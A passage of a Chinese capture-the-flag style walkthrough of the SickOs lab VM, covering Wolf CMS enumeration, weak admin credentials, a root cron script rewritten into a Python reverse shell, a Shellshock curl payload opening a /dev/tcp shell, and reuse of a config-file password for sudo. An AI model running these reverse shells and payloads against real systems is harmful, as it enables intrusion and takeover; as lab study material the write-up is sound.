-   20B  - /wolfcms/config/database.yml</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/app.php</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/database.yml.sqlite3              </span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/                                  </span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/db.inc</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/monkid.ini</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/config.inc</span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/config.ini</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/master.key</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/monkcheckout.ini</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/monkdonate.ini</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/development/</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/producao.ini</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/settings.ini</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/settings.inc</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/initializers/secret_token.rb</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/settings/production.yml           </span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/site.php</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/database.yml~</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/routes.yml</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/settings.ini.cfm                  </span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/settings.local.yml</span><br><span class="line">[03:15:54] 200 -   20B  - /wolfcms/config/xml/                              </span><br><span class="line">[03:15:53] 200 -   20B  - /wolfcms/config/databases.yml                     </span><br><span class="line">[03:15:54] 200 -    4KB - /wolfcms/CONTRIBUTING.md                          </span><br><span class="line">[03:15:58] 301 -  253B  - /wolfcms/docs  -&gt;  http://192.168.159.23/wolfcms/docs/</span><br><span class="line">[03:15:58] 200 -  512B  - /wolfcms/docs/                                    </span><br><span class="line">[03:15:58] 200 -    2KB - /wolfcms/docs/updating.txt                        </span><br><span class="line">[03:16:02] 200 -  894B  - /wolfcms/favicon.ico                              </span><br><span class="line">[03:16:26] 301 -  257B  - /wolfcms/public  -&gt;  http://192.168.159.23/wolfcms/public/</span><br><span class="line">[03:16:26] 200 -  462B  - /wolfcms/public/                                  </span><br><span class="line">[03:16:27] 200 -    2KB - /wolfcms/README.md                                </span><br><span class="line">[03:16:29] 200 -   20B  - /wolfcms/robots.txt                               </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed  </span><br></pre></td></tr></table></figure>
<p>由 README.md 得当前版本 wolfcms-v0.8.2 ，查相关漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># searchsploit Wolf CMS                                  </span></span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                                                                                  |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Wolf CMS - Arbitrary File Upload / Execution                                                                                                                                                                                                    | php/webapps/38000.txt</span><br><span class="line">Wolf CMS 0.6.0b - Multiple Vulnerabilities                                                                                                                                                                                                      | php/webapps/15614.html</span><br><span class="line">Wolf CMS 0.7.5 - Multiple Vulnerabilities                                                                                                                                                                                                       | php/webapps/18545.txt</span><br><span class="line">Wolf CMS 0.8.2 - Arbitrary File Upload                                                                                                                                                                                                          | php/webapps/36818.php</span><br><span class="line">Wolf CMS 0.8.2 - Arbitrary File Upload (Metasploit)                                                                                                                                                                                             | php/remote/40004.rb</span><br><span class="line">Wolf CMS 0.8.3.1 - Remote Code Execution (RCE)                                                                                                                                                                                                  | php/webapps/51421.txt</span><br><span class="line">Wolfcms 0.75 - Cross-Site Request Forgery / Cross-Site Scripting                                                                                                                                                                                | php/webapps/18652.txt</span><br><span class="line">WolfCMS 0.8.3.1 - Cross-Site Request Forgery                                                                                                                                                                                                    | php/webapps/44418.txt</span><br><span class="line">WolfCMS 0.8.3.1 - Open Redirection                                                                                                                                                                                                              | php/webapps/44421.txt</span><br><span class="line">WolfSight CMS 3.2 - SQL Injection                                                                                                                                                                                                               | php/webapps/44997.txt</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>进一步确认需要登陆才能利用，不过测试发现存在弱口令
<code>admin/admin</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410181615904.jpg" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 Shell</h3>
<p>上传 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410181620796.jpg" /></p>
<p>反弹获得 <code>www-data</code> shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410181620476.jpg" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>/var/www 下有个 connect.py
，权限配置似乎有问题，看其脚本内容似乎存在定时任务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/var$ <span class="built_in">ls</span> -al www/</span><br><span class="line">total 24</span><br><span class="line">drwxrwxrwx  3 root root 4096 Dec  6  2015 .</span><br><span class="line">drwxr-xr-x 13 root root 4096 Dec  6  2015 ..</span><br><span class="line">-rwxrwxrwx  1 root root  109 Dec  5  2015 connect.py</span><br><span class="line">-rw-r--r--  1 root root   21 Dec  5  2015 index.php</span><br><span class="line">-rw-r--r--  1 root root   45 Dec  5  2015 robots.txt</span><br><span class="line">drwxr-xr-x  5 root root 4096 Dec  5  2015 wolfcms</span><br><span class="line">www-data@SickOs:/var$ <span class="built_in">cd</span> www/         </span><br><span class="line">www-data@SickOs:/var/www$ </span><br><span class="line">www-data@SickOs:/var/www$ <span class="built_in">cat</span> connect.py </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;I Try to connect things very frequently\n&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;You may want to try my services&quot;</span></span><br><span class="line">www-data@SickOs:/var/www$</span><br></pre></td></tr></table></figure>
<p>查系统是 32 位的，上传 pspy32 监听看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/tmp$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux SickOs 3.11.0-15-generic <span class="comment">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可见存在 root 用户的定时任务</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410182053530.jpg" /></p>
<p>修改 connect.py 脚本，弹个 root 的 shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.159.174&quot;</span>,<span class="number">4445</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">import</span> pty </span><br><span class="line">pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;I Try to connect things very frequently\n&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;You may want to try my services&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提权成功</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410181857906.jpg" /></p>
<h2 id="复盘">3. 复盘</h2>
<h3 id="定时任务">3.1. 定时任务</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@SickOs:/<span class="comment"># cat /etc/crontab /etc/cron.d/*</span></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow user  command</span></span><br><span class="line">17 *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">* * * * * root /usr/bin/python /var/www/connect.py</span><br><span class="line"><span class="comment"># /etc/cron.d/php5: crontab fragment for php5</span></span><br><span class="line"><span class="comment">#  This purges session files older than X, where X is defined in seconds</span></span><br><span class="line"><span class="comment">#  as the largest value of session.gc_maxlifetime from all your php.ini</span></span><br><span class="line"><span class="comment">#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Look for and purge old sessions every 30 minutes</span></span><br><span class="line">09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] &amp;&amp; [ -d /var/lib/php5 ] &amp;&amp; find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -<span class="built_in">type</span> f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s &#123;&#125; 2&gt;/dev/null \; -delete</span><br><span class="line">root@SickOs:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h3 id="cgi---shell">3.2. CGI - Shell</h3>
<p>看了其他师傅的 WP ，有利用 CGI 反弹 Shell 的（CVE-2014-6271），Web
访问</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410191453603.jpg" /></p>
<p>进一步分析，相关文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@SickOs:~<span class="comment"># ls -al /usr/lib/cgi-bin/</span></span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 Sep 22  2015 .</span><br><span class="line">drwxr-xr-x 58 root root 4096 Dec  5  2015 ..</span><br><span class="line">-rwxrwxrwx  1 root root  120 Oct  2  2014 status</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line">root@SickOs:~<span class="comment"># cat /usr/lib/cgi-bin/status </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-Type: application/json&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#123; &quot;uptime&quot;: &quot;&#x27;</span>`<span class="built_in">uptime</span>`<span class="string">&#x27;&quot;, &quot;kernel&quot;: &quot;&#x27;</span>`<span class="built_in">uname</span> -a`<span class="string">&#x27;&quot;&#125; &#x27;</span></span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>测试 CVE-2014-6271 漏洞有效</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@SickOs:~<span class="comment"># env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;</span></span><br><span class="line">vulnerable</span><br><span class="line">this is a <span class="built_in">test</span></span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p><strong><em>原理分析可参见</em></strong></p>
<ul>
<li><a
target="_blank" rel="noopener" href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">Bash破壳漏洞CVE-2014-6271复现分析
– Zgao's blog</a><br />
</li>
<li><a
target="_blank" rel="noopener" href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">Bash
3.0-4.3命令执行漏洞分析 - 知道创宇</a></li>
</ul>
<p>结合 CGI 反弹 Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x http://192.168.159.23:3128 -H <span class="string">&quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.159.174/6666 0&gt;&amp;1&quot;</span> http://192.168.159.23/cgi-bin/status</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410191509893.jpg" /></p>
<p>成功获得 shell</p>
<h3 id="sickos-用户">3.3. SickOs 用户</h3>
<p>conofig.php 所得数据库密码亦是 <code>sickos</code> 用户密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/<span class="keyword">var</span>/www/wolfcms$ cat config.php</span><br><span class="line">cat config.php</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Database information:</span></span><br><span class="line"><span class="comment">// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)</span></span><br><span class="line"><span class="comment">// The path can only be absolute path or :memory:</span></span><br><span class="line"><span class="comment">// For more info look at: www.php.net/pdo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Database settings:</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_DSN&#x27;</span>, <span class="string">&#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PASS&#x27;</span>, <span class="string">&#x27;john@123&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
<p><code>sickos</code> 登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/home$ su sickos</span><br><span class="line">su sickos</span><br><span class="line">su: must be run from a terminal</span><br><span class="line">www-data@SickOs:/home$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@SickOs:/home$ </span><br><span class="line"></span><br><span class="line">www-data@SickOs:/home$ su sickos</span><br><span class="line">su sickos</span><br><span class="line">Password: john@123</span><br><span class="line"></span><br><span class="line">sickos@SickOs:/home$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(sickos) gid=1000(sickos) <span class="built_in">groups</span>=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">sickos@SickOs:/home$ </span><br><span class="line"></span><br><span class="line">sickos@SickOs:/home$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">sickos@SickOs:~$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 sickos sickos 4096 Sep 22  2015 .</span><br><span class="line">drwxr-xr-x 3 root   root   4096 Sep 22  2015 ..</span><br><span class="line">-rw------- 1 sickos sickos   13 Sep 22  2015 .bash_history</span><br><span class="line">-rw-r--r-- 1 sickos sickos  220 Sep 22  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 sickos sickos 3486 Sep 22  2015 .bashrc</span><br><span class="line">drwx------ 2 sickos sickos 4096 Sep 22  2015 .cache</span><br><span class="line">-rw-r--r-- 1 sickos sickos  675 Sep 22  2015 .profile</span><br><span class="line">sickos@SickOs:~$ </span><br></pre></td></tr></table></figure>
<p>sickos 提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sickos@SickOs:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> sickos: john@123</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sickos on this host:</span><br><span class="line">    env_reset,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sickos may run the following commands on this host:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">sickos@SickOs:~$ </span><br><span class="line"></span><br><span class="line">sickos@SickOs:~$ sudo /bin/bash</span><br><span class="line">sudo /bin/bash</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">root@SickOs:~<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获得 root 权限</p>
<h3 id="mysql-提权探讨">3.4. MySQL 提权探讨</h3>
<p>从 config.php 中得到了 MySQL
的连接信息，<code>root/john@123</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/$ <span class="built_in">cd</span> /var/</span><br><span class="line">www-data@SickOs:/var$ <span class="built_in">cd</span> www/</span><br><span class="line">www-data@SickOs:/var/www$ <span class="built_in">cd</span> wolfcms/</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ </span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ <span class="built_in">ls</span> -al</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 5 root root 4096 Dec  5  2015 .</span><br><span class="line">drwxrwxrwx 3 root root 4096 Dec  6  2015 ..</span><br><span class="line">-rwxr-xr-x 1 root root  950 Dec  5  2015 .htaccess</span><br><span class="line">-rwxrwxrwx 1 root root 4084 Dec  5  2015 CONTRIBUTING.md</span><br><span class="line">-rwxrwxrwx 1 root root 2405 Dec  5  2015 README.md</span><br><span class="line">-rwxrwxrwx 1 root root  403 Dec  5  2015 composer.json</span><br><span class="line">-rwxrwxrwx 1 root root 3058 Dec  5  2015 config.php</span><br><span class="line">drwxrwxrwx 2 root root 4096 Dec  5  2015 docs</span><br><span class="line">-rwxrwxrwx 1 root root  894 Dec  5  2015 favicon.ico</span><br><span class="line">-rwxrwxrwx 1 root root 6815 Dec  5  2015 index.php</span><br><span class="line">drwxrwxrwx 4 root root 4096 Oct 18 21:47 public</span><br><span class="line">-rwxrwxrwx 1 root root    0 Dec  5  2015 robots.txt</span><br><span class="line">drwxrwxrwx 7 root root 4096 Dec  5  2015 wolf</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ </span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ <span class="built_in">cat</span> config.php </span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Database information:</span><br><span class="line">// <span class="keyword">for</span> SQLite, use sqlite:/tmp/wolf.db (SQLite 3)</span><br><span class="line">// The path can only be absolute path or :memory:</span><br><span class="line">// For more info look at: www.php.net/pdo</span><br><span class="line"></span><br><span class="line">// Database settings:</span><br><span class="line">define(<span class="string">&#x27;DB_DSN&#x27;</span>, <span class="string">&#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASS&#x27;</span>, <span class="string">&#x27;john@123&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Should Wolf produce PHP error messages <span class="keyword">for</span> debugging?</span><br><span class="line">define(<span class="string">&#x27;DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">// Should Wolf check <span class="keyword">for</span> updates on Wolf itself and the installed plugins?</span><br><span class="line">define(<span class="string">&#x27;CHECK_UPDATES&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">// The number of seconds before the check <span class="keyword">for</span> a new Wolf version <span class="built_in">times</span> out <span class="keyword">in</span> <span class="keyword">case</span> of problems.</span><br><span class="line">define(<span class="string">&#x27;CHECK_TIMEOUT&#x27;</span>, 3);</span><br><span class="line"></span><br><span class="line">// The full URL of your Wolf CMS install</span><br><span class="line">define(<span class="string">&#x27;URL_PUBLIC&#x27;</span>, <span class="string">&#x27;/wolfcms/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Use httpS <span class="keyword">for</span> the backend?</span><br><span class="line">// Before enabling this, please make sure you have a working HTTP+SSL installation.</span><br><span class="line">define(<span class="string">&#x27;USE_HTTPS&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">// Use HTTP ONLY setting <span class="keyword">for</span> the Wolf CMS authentication cookie?</span><br><span class="line">// This requests browsers to make the cookie only available through HTTP, so not javascript <span class="keyword">for</span> example.</span><br><span class="line">// Defaults to <span class="literal">false</span> <span class="keyword">for</span> backwards compatibility.</span><br><span class="line">define(<span class="string">&#x27;COOKIE_HTTP_ONLY&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">// The virtual directory name <span class="keyword">for</span> your Wolf CMS administration section.</span><br><span class="line">define(<span class="string">&#x27;ADMIN_DIR&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Change this setting to <span class="built_in">enable</span> mod_rewrite. Set to <span class="string">&quot;true&quot;</span> to remove the <span class="string">&quot;?&quot;</span> <span class="keyword">in</span> the URL.</span><br><span class="line">// To <span class="built_in">enable</span> mod_rewrite, you must also change the name of <span class="string">&quot;_.htaccess&quot;</span> <span class="keyword">in</span> your</span><br><span class="line">// Wolf CMS root directory to <span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">define(<span 